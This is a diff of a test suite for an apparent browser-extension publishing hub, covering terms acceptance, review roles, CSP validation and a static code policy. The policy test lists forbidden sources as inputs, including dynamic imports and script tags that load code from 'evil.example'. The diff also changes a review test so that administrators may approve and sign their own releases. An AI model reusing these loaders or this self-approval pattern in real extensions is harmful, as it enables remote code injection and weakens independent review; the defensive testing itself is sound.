@@ -7,6 +7,7 @@ import { verifyHubSignerProof } from '../../src/shared/hub-signer-proof.ts'
 import { enforceRateLimit, OAUTH_COOKIE, sha256 } from '../src/security.ts'
 import { optionalLegalConfig, PUBLISHER_TERMS_VERSION, publisherTermsText } from '../src/legal.ts'
 import signerWorker from '../src/signer.ts'
+import { validatePublisherPackage } from '../src/validation.ts'
 import { TEST_SIGNING_KEY_ID, TEST_SIGNING_PRIVATE_PKCS8, TEST_SIGNING_PUBLIC_SPKI } from './fixtures/test-signing-key.ts'
 
 const origin = 'https://extensions.vastbrowser.com'
@@ -179,6 +180,10 @@ describe('public catalog and security envelope', () => {
   it('blocks publishing until the current terms are accepted and requires privacy disclosure', async () => {
     await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
     await env.DB.prepare('DELETE FROM publisher_terms_acceptances WHERE publisher_id=?1').bind(publisherId).run()
+    const dashboard = await call('/dashboard', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
+    const dashboardHtml = await dashboard.text()
+    expect(dashboardHtml).toContain('terms-panel')
+    expect(dashboardHtml).toContain('consent-control')
     const payload = { slug: 'terms-test', name: 'Terms test', summary: 'Terms test listing.', description: 'Terms fixture.', category: 'developer', homepage: '', sourceUrl: '', dataPractice: 'external-processing', privacyPolicyUrl: '', remoteServices: 'Example API' }
     const blocked = await call('/v1/publisher/extensions', { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify(payload) })
     expect(blocked.status).toBe(428)
@@ -232,6 +237,7 @@ describe('public catalog and security envelope', () => {
     const dashboard = await call('/dashboard', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
     const dashboardHtml = await dashboard.text()
     expect(dashboardHtml).toContain('listing-data-form')
+    expect(dashboardHtml).toContain('file-picker__surface')
     expect(dashboardHtml).toContain('Example API')
   })
 })
@@ -358,7 +364,7 @@ describe('publisher upload and role-aware review', () => {
     await expect(verifyVextPackage(storageTamper, [trusted], true)).rejects.toThrow()
   })
 
-  it('requires a separate reviewer identity even for administrators', async () => {
+  it('allows an administrator to approve and sign its own publisher release with an audit marker', async () => {
     await seedPublisher(publisherId, 'admin', sessionToken, csrfToken)
     const id = await createListing({ slug: 'admin-extension', name: 'Admin Extension' })
     const uploadBytes = await fixturePackage(id)
@@ -377,18 +383,24 @@ describe('publisher upload and role-aware review', () => {
     const queue = await call('/review', { headers: { cookie: `__Host-vast_hub_session=${sessionToken}` } })
     expect(queue.status).toBe(200)
     const queueHtml = await queue.text()
-    expect(queueHtml).toContain('Separate reviewer required')
+    expect(queueHtml).toContain('Admin self-review')
+    expect(queueHtml).toContain('Administrator exception')
+    expect(queueHtml).not.toContain('Separate reviewer required')
 
     const approval = await call(`/v1/review/submissions/${submissionId}`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/json' }, body: JSON.stringify({ action: 'approve', note: '' }) })
-    expect(approval.status).toBe(403)
-    expect((await call(`/v1/install/${id}`)).status).toBe(404)
+    expect(approval.status).toBe(200)
+    expect((await call(`/v1/install/${id}`)).status).toBe(200)
+    expect(await env.DB.prepare(`SELECT action,note FROM audit_log WHERE target_type='release' AND target_id=?1 ORDER BY created_at DESC LIMIT 1`).bind(release.releaseId).first()).toEqual({
+      action: 'admin-self-approve-and-sign',
+      note: 'Administrator self-review authorized.'
+    })
   })
 
   it('enforces ownership, reviewer roles, notes, and static code policy', async () => {
     await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
     await seedPublisher(reviewerId, 'reviewer', reviewerSessionToken, reviewerCsrfToken)
     const id = await createListing()
-    for (const source of ['eval("remote")', 'new Function("return 1")()', 'window.Function("return 1")()', 'setTimeout("run()", 1)', 'window.setInterval("run()", 1)', 'import("https://evil.example/code.js")', 'new Worker("https://evil.example/worker.js")', 'navigator.serviceWorker.register("https://evil.example/sw.js")', 'WebAssembly.compile(new Uint8Array())', 'const script=document.createElement("script");script.src="https://evil.example/code.js"', 'let script;script=document.createElement("script");script.setAttribute("src","https://evil.example/code.js")']) {
+    for (const source of ['eval("remote")', '(0, eval)("remote")', 'window["eval"]("remote")', 'new Function("return 1")()', 'window.Function("return 1")()', 'setTimeout("run()", 1)', 'window.setInterval("run()", 1)', 'import("https://evil.example/code.js")', 'new Worker("https://evil.example/worker.js")', 'navigator.serviceWorker.register("https://evil.example/sw.js")', 'WebAssembly.compile(new Uint8Array())', 'const script=document.createElement("script");script.src="https://evil.example/code.js"', 'let script;script=document.createElement("script");script.setAttribute("src","https://evil.example/code.js")']) {
       const forbiddenBytes = await fixturePackage(id, '1.0.0', source)
       const forbidden = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: forbiddenBytes.slice().buffer })
       expect(forbidden.status, source).toBe(400)
@@ -400,6 +412,28 @@ describe('publisher upload and role-aware review', () => {
     expect(other.status).toBe(404)
     const invalidMedia = await call(`/v1/publisher/extensions/${id}/media?kind=icon`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'image/png' }, body: encoder.encode('not a png').slice().buffer })
     expect(invalidMedia.status).toBe(400)
+  })
+
+  it('allows local Manifest V2 providers and rejects relaxed CSP or missing background files', async () => {
+    const id = 'abcdefghijklmnopabcdefghijklmnop'
+    const check = async (csp: string, scripts = ['background.js']) => {
+      const bytes = await createVextPackage({ extensionId: id, version: '1.0.0', publisherId, files: new Map([
+        ['manifest.json', encoder.encode(JSON.stringify({ name: 'Network fixture', version: '1.0.0', manifest_version: 2, vast_network: 1, permissions: ['webRequest', 'webRequestBlocking', 'https://*/*'], background: { scripts, persistent: true }, content_security_policy: csp }))],
+        ['background.js', encoder.encode('globalThis.vastWebRequest={handle:()=>({})}')]
+      ]) })
+      return validatePublisherPackage(bytes, id, publisherId)
+    }
+    expect((await check("script-src 'self'; object-src 'none'")).kind).toBe('chrome')
+    for (const csp of ["script-src 'self' 'unsafe-eval'; object-src 'none'", "script-src https://example.com; object-src 'none'", "script-src 'self'; object-src 'none'; worker-src https://example.com", "script-src 'self'; object-src 'none'; script-src 'unsafe-inline'"]) await expect(check(csp)).rejects.toThrow()
+    await expect(check("script-src 'self'; object-src 'none'", ['missing.js'])).rejects.toThrow(/does not exist/)
+  })
+
+  it('accepts documentation of prohibited APIs without treating comments or text as execution', async () => {
+    await seedPublisher(publisherId, 'publisher', sessionToken, csrfToken)
+    const id = await createListing()
+    const bytes = await fixturePackage(id, '1.0.0', '// Never use eval() or new Function()\nconst description = `setTimeout("code", 1) is prohibited`;')
+    const response = await call(`/v1/publisher/extensions/${id}/releases`, { method: 'POST', headers: { ...authHeaders(), 'content-type': 'application/vnd.vast.extension+zip' }, body: bytes.slice().buffer })
+    expect(response.status).toBe(201)
   })
 
   it('marks large one-line JavaScript for manual review without hiding the finding', async () => {
